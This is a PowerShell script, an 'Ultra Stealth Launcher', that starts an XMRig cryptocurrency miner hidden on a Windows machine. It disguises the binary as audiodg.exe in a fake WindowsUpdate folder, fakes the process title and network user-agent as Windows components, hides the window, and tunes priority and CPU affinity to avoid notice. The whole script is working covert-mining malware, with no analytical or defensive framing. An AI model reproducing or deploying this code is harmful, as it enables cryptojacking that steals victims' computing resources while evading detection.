# ================================================================================================
# ULTRA STEALTH LAUNCHER
# Launches miner with maximum stealth in Task Manager
# ================================================================================================

param(
    [string]$MinerPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe",
    [string]$ConfigPath = "C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json"
)

# ================================================================================================
# STEALTH PROCESS START
# ================================================================================================

function Start-StealthMiner {
    param($MinerPath, $ConfigPath)
    
    # Check if already running
    $existing = Get-Process | Where-Object { 
        $_.Path -like "*audiodg.exe*" -and $_.Path -like "*WindowsUpdate*"
    }
    
    if ($existing) {
        Write-Host "Miner already running (PID: $($existing.Id))"
        return
    }
    
    # Prepare stealth launch parameters
    $arguments = @(
        "--config=`"$ConfigPath`""
        "--no-color"           # Disable colored output
        "--print-time=60"      # Reduce output frequency
        "--title=Windows Audio Device Graph Isolation"  # Disguise window title
        "--user-agent=`"Windows-Update-Client/10.0`""   # Disguise network traffic
    )
    
    # Start process with maximum stealth
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = $MinerPath
    $startInfo.Arguments = $arguments -join " "
    $startInfo.UseShellExecute = $false
    $startInfo.CreateNoWindow = $true           # No window
    $startInfo.WindowStyle = "Hidden"           # Hidden if window created
    $startInfo.WorkingDirectory = Split-Path $MinerPath
    
    # Set environment variables for additional stealth
    $startInfo.EnvironmentVariables["XMRIG_ALGO"] = "rx/0"
    $startInfo.EnvironmentVariables["XMRIG_TITLE"] = "Windows Audio Device Graph Isolation"
    
    try {
        $process = [System.Diagnostics.Process]::Start($startInfo)
        
        # Wait a moment for process to stabilize
        Start-Sleep -Seconds 2
        
        # Set process priority to below normal (less suspicious)
        try {
            $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal
        } catch {
            # Ignore if we can't set priority
        }
        
        # Set process affinity to reduce CPU visibility (use fewer cores)
        try {
            $totalCores = [System.Environment]::ProcessorCount
            $useCores = [Math]::Max(1, $totalCores - 1)  # Use all but one core
            $affinityMask = [Math]::Pow(2, $useCores) - 1
            $process.ProcessorAffinity = [IntPtr]$affinityMask
        } catch {
            # Ignore if we can't set affinity
        }
        
        Write-Host "Miner started stealthily (PID: $($process.Id))"
        
    } catch {
        Write-Host "Failed to start miner: $($_.Exception.Message)"
    }
}

# ================================================================================================
# MAIN
# ================================================================================================

if (Test-Path $MinerPath) {
    Start-StealthMiner -MinerPath $MinerPath -ConfigPath $ConfigPath
} else {
    Write-Host "Miner not found at: $MinerPath"
}
